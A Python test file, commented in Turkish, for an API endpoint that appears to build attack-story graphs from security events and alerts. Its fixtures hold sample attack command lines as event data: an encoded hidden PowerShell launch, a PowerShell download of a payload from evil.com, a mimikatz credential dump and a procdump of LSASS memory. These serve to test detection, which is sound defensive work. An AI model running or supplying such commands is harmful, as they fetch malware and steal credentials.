"""
tests.test_story_graph_preview_api
=====================================
POST /api/story/graph-preview API endpoint testleri.
FastAPI TestClient ile çalışır — auth dependency'leri override edilir.
DB erişimi yok, tamamen in-memory.
"""

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.api.routes_story import _graph_auth_dependency
from app.core.security import get_current_tenant_id


# ---------------------------------------------------------------------------
# Auth Override Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def _override_auth():
    """Auth dependency'lerini override et — DB'siz test."""

    async def _mock_user():
        return "test-analyst"

    async def _mock_tenant():
        return "test-tenant"

    app.dependency_overrides[_graph_auth_dependency] = _mock_user
    app.dependency_overrides[get_current_tenant_id] = _mock_tenant
    yield
    app.dependency_overrides.clear()


@pytest.fixture
def client():
    return TestClient(app)


# ---------------------------------------------------------------------------
# Test Helpers
# ---------------------------------------------------------------------------

def _powershell_chain_raw():
    """PowerShell chain rule'ını tetikleyecek 2 raw event dict."""
    return [
        {
            "type": "PROCESS_START",
            "hostname": "WS-01",
            "user": "admin",
            "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA",
            "severity": "HIGH",
            "risk_score": 75,
        },
        {
            "type": "PROCESS_START",
            "hostname": "WS-01",
            "user": "admin",
            "command_line": "powershell.exe Invoke-WebRequest http://evil.com/payload -OutFile c:\\temp\\p.exe",
            "severity": "HIGH",
            "risk_score": 80,
        },
    ]


def _credential_chain_alerts():
    """Credential dumping chain tetikleyecek alert dict'ler."""
    return [
        {
            "id": "alert-001",
            "hostname": "DC-01",
            "username": "attacker",
            "type": "PROCESS_START",
            "command_line": "mimikatz.exe privilege::debug",
            "risk_score": 90,
            "severity": "CRITICAL",
            "details": "sekurlsa logonpasswords",
            "rule": "Credential Dumping",
        },
        {
            "id": "alert-002",
            "hostname": "DC-01",
            "username": "attacker",
            "type": "PROCESS_START",
            "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
            "risk_score": 85,
            "severity": "HIGH",
            "details": "lsass dump",
            "rule": "LSASS Access",
        },
    ]


# ---------------------------------------------------------------------------
# 1. Route registered
# ---------------------------------------------------------------------------

class TestGraphPreviewRouteRegistered:

    def test_route_registered(self, client):
        """POST /api/story/graph-preview kayıtlı — 422 veya 200 (405 değil)."""
        resp = client.post("/api/story/graph-preview")
        assert resp.status_code != 405, "Route kayıtlı değil!"


# ---------------------------------------------------------------------------
# 2. Raw events → story_graphs üretir
# ---------------------------------------------------------------------------

class TestGraphPreviewRawEvents:

    def test_raw_events_produces_graph(self, client):
        """POST /api/story/graph-preview raw_events → story_graphs boş değil."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert "story_graphs" in data
        assert len(data["story_graphs"]) >= 1
        assert len(data["attack_stories"]) >= 1
        assert data["warnings"] == []


# ---------------------------------------------------------------------------
# 3. Graph has nodes and edges
# ---------------------------------------------------------------------------

class TestGraphPreviewNodesEdges:

    def test_graph_has_nodes_and_edges(self, client):
        """İlk graph içinde nodes ve edges boş değil."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        graph = data["story_graphs"][0]
        assert len(graph["nodes"]) > 0
        assert len(graph["edges"]) > 0

        # Root story node var mı?
        story_nodes = [n for n in graph["nodes"] if n["node_type"] == "story"]
        assert len(story_nodes) == 1

    def test_graph_nodes_have_required_fields(self, client):
        """Her node id, node_type, label alanlarına sahip."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        graph = data["story_graphs"][0]
        for node in graph["nodes"]:
            assert "id" in node
            assert "node_type" in node
            assert "label" in node

    def test_graph_edges_have_required_fields(self, client):
        """Her edge source, target, edge_type alanlarına sahip."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        graph = data["story_graphs"][0]
        for edge in graph["edges"]:
            assert "source" in edge
            assert "target" in edge
            assert "edge_type" in edge


# ---------------------------------------------------------------------------
# 4. Summary graph_count
# ---------------------------------------------------------------------------

class TestGraphPreviewSummaryGraphCount:

    def test_summary_graph_count(self, client):
        """summary.graph_count >= 1."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        assert data["summary"]["graph_count"] >= 1


# ---------------------------------------------------------------------------
# 5. Summary total_nodes and total_edges
# ---------------------------------------------------------------------------

class TestGraphPreviewSummaryTotals:

    def test_summary_total_nodes_and_edges(self, client):
        """summary.total_nodes > 0, summary.total_edges > 0."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        assert data["summary"]["total_nodes"] > 0
        assert data["summary"]["total_edges"] > 0

    def test_summary_totals_match_graphs(self, client):
        """Summary totals, graph'ların toplamına eşit olmalı."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        expected_nodes = sum(
            g.get("summary", {}).get("node_count", 0)
            for g in data["story_graphs"]
        )
        expected_edges = sum(
            g.get("summary", {}).get("edge_count", 0)
            for g in data["story_graphs"]
        )
        assert data["summary"]["total_nodes"] == expected_nodes
        assert data["summary"]["total_edges"] == expected_edges


# ---------------------------------------------------------------------------
# 6. Alerts → graph üretir
# ---------------------------------------------------------------------------

class TestGraphPreviewAlerts:

    def test_alerts_produces_graph(self, client):
        """Credential chain alerts → graph üretir."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "alerts",
            "items": _credential_chain_alerts(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert len(data["story_graphs"]) >= 1
        assert len(data["attack_stories"]) >= 1

        graph = data["story_graphs"][0]
        host_nodes = [n for n in graph["nodes"] if n["node_type"] == "host"]
        assert len(host_nodes) >= 1


# ---------------------------------------------------------------------------
# 7. Unsupported source_type → 400
# ---------------------------------------------------------------------------

class TestGraphPreviewUnsupportedSourceType:

    def test_unsupported_source_type_400(self, client):
        """Bilinmeyen source_type → HTTP 400."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "INVALID_TYPE",
            "items": [{"foo": "bar"}],
        })
        assert resp.status_code == 400
        assert "Desteklenmeyen source_type" in resp.json()["detail"]

    def test_unsupported_source_type_includes_name(self, client):
        """400 detail gönderilen source_type'ı içermeli."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "BOGUS",
            "items": [],
        })
        assert resp.status_code == 400
        assert "BOGUS" in resp.json()["detail"]


# ---------------------------------------------------------------------------
# 8. Empty items → safe result
# ---------------------------------------------------------------------------

class TestGraphPreviewEmptyItems:

    def test_empty_items_safe_result(self, client):
        """Boş items → 200, story_graphs = [], graph_count = 0."""
        resp = client.post("/api/story/graph-preview", json={
            "source_type": "raw_events",
            "items": [],
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["story_graphs"] == []
        assert data["summary"]["graph_count"] == 0
        assert data["summary"]["total_nodes"] == 0
        assert data["summary"]["total_edges"] == 0
        assert data["summary"]["total_events"] == 0

    def test_empty_items_all_source_types(self, client):
        """Tüm source_type'lar boş items ile çalışmalı."""
        for source_type in ["raw_events", "alerts", "command_results", "normalized_events"]:
            resp = client.post("/api/story/graph-preview", json={
                "source_type": source_type,
                "items": [],
            })
            assert resp.status_code == 200
            assert resp.json()["story_graphs"] == []


# ---------------------------------------------------------------------------
# 9. Auth rejected
# ---------------------------------------------------------------------------

class TestGraphPreviewAuthRejected:

    def test_unauthenticated_rejected(self, client):
        """Auth override temizlenince → 401."""
        app.dependency_overrides.clear()

        resp = client.post("/api/story/graph-preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 401


# ---------------------------------------------------------------------------
# 10. Mevcut /api/story/preview bozulmaz
# ---------------------------------------------------------------------------

class TestExistingPreviewNotBroken:

    def test_existing_preview_still_works(self, client):
        """Mevcut /api/story/preview hâlâ çalışıyor."""
        # _graph_auth_dependency override, preview'u etkilememeli
        # Preview kendi _auth_dependency'sini kullanıyor
        from app.api.routes_story import _auth_dependency
        app.dependency_overrides[_auth_dependency] = lambda: "test-analyst"

        resp = client.post("/api/story/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert "attack_stories" in data
        assert "story_graphs" not in data  # Preview'da graph yok
        assert data["summary"]["total_events"] == 2
